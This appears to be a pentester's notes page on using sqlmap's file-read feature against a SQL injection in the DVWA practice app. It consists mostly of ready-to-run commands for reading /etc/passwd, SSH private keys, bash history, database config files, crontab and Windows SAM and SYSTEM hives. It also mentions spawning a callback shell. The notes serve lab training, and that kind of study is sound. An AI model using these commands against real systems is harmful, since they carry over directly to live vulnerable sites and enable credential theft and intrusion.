# 04 - OS Enumeration

Search Tag: #sql-injection #sqlmap #enumeration-and-discovery #dvwa

## 4.1 - Conditions

1. The DB user must have **FILE** and **SELECT** privileges perform with the flags `--privileges -U CU`.
2. **Note:** Not all files are readable unless the current user is `root@<IP>` (e.g. `root@localhost`). You'll notice that you can't fetch SSH credentials which is normal due to security reasons.

## 4.2 - General

- Enumerate hostname

```
$ sqlmap "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --hostname
```
## 4.3 - Linux

### 4.3.1 - Basic Information

- Enumerating user accounts

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/passwd"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --sql-query="SELECT LOAD_FILE('/etc/passwd')"
```

- Enumerate user groups

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/group"
```

- Local IPv4 address

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/network/interfaces"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/sysconfig/network"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/networks"
```

- DNS resolve and nameserver IPs

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/resolv.conf"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/hosts"
```

- Environment variables may contain **sensitive information**. You never know that sometimes the sysadmins can be lazy sometimes.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/profile"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/bash.bashrc"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/home/<username>/.bash_profile"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/root/.bash_profile"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/home/<username>/.bashrc"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/root/.bashrc"
```

- Enumerate installed packages that will give you an idea of what services are installed.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/var/log/dpkg.log"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/var/log/yum.log"
```

- Enumerate Linux kernel

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/lsb-release"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/os-release"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/proc/version"
```

### 4.3.2 - Credentials

- Retrieve SSH keys

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/home/<username>/.ssh/id_rsa"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/root/.ssh/id_rsa"
```

- Retrieve database config file. You have to lookup of what web technology it's using such as, a **content management system (CMS)** like wordpress. Find the absolute path of the [[Content Management System (CMS)#^bc9e6e|database config file]] after enumeration phase for the web root directory.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/var/www/html/dvwa/config.php"
```

- Retrieve history commands. You can find more in the [[Content Management System (CMS)|privilege escalation credentials]] section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/home/<username>/.ssh/.bash_history"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/root/.ssh/.bash_history"
```

### 4.3.3 - Privilege Escalation

- CronJobs may contain backup files that is worth **harvesting the data**. Moreover, there is a possible attack vector to spawn a callback shell. Be on the lookout.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/crontab"
```

### 4.3.4 - Config Files

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/ssh/sshd_config"
```

### 4.3.5 - Hardware

- Check uptime

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/proc/uptime"
```

- Enumerate mounted drives and network shares.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/etc/fstab"
```

- Enumerate CPU cores

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="/proc/cpuinfo"
```

## 4.4 - Windows

TODO: Provide examples for windows OS enumeration using `--file-read`

### 4.4.1 - Basic Information

- DNS resolve and nameserver IPs

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="C:/Windows/System32/drivers/etc/hosts"
```

### 4.4.2 - Credentials

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="C:/Windows/Repair/SAM"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="C:/Windows/Repair/SYSTEM"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="C:/Windows/System32/config/security"
           
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="C:/Windows/System32/config/system"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-read="C:/Windows/System32/config/sam"
```

---
## References

- [SQLMap Read File on the Server](https://rioasmara.com/2020/05/25/sqlmap-read-file-on-the-server/)